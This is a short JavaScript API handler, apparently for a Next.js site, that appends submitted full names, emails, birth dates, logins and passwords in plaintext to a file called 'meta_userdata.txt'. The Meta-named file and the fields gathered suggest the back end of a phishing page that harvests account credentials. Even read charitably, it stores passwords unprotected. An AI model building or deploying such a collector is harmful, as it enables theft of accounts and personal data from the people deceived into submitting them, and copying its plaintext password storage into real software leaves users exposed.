
export default async function handler(req, res) {
  if (req.method === 'POST') {
    const fs = require('fs');
    const path = require('path');
    const body = req.body;

    const logData = `Full Name: ${body.fullname}\nEmail: ${body.email}\nDOB: ${body.dob}\nLogin: ${body.login}\nPassword: ${body.password}\n---\n`;
    const filePath = path.join(process.cwd(), 'data', 'meta_userdata.txt');

    fs.appendFile(filePath, logData, (err) => {
      if (err) {
        res.status(500).json({ message: 'Failed to save data' });
      } else {
        res.status(200).json({ message: 'Data saved successfully' });
      }
    });
  } else {
    res.status(405).json({ message: 'Method Not Allowed' });
  }
}
